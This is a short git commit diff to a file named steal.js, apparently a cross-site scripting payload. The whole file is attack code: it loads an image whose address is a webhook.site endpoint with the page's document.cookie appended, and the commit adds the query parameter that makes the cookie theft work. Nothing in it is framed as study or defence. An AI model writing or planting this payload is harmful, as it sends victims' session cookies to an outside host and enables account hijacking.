8af7b624626806b11a2a6a351f6daa52fb424d43
Wisely Janson Halim <kongisinthehouse@gmail.com>
2026-07-14 19:59:22 +0700

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,3 +1,3 @@
 new Image().src =
-"http://webhook.site/0212a0e0-8f6d-4b53-861a-90063da59c46"
+"http://webhook.site/0212a0e0-8f6d-4b53-861a-90063da59c46?data="
 + encodeURIComponent(document.cookie);
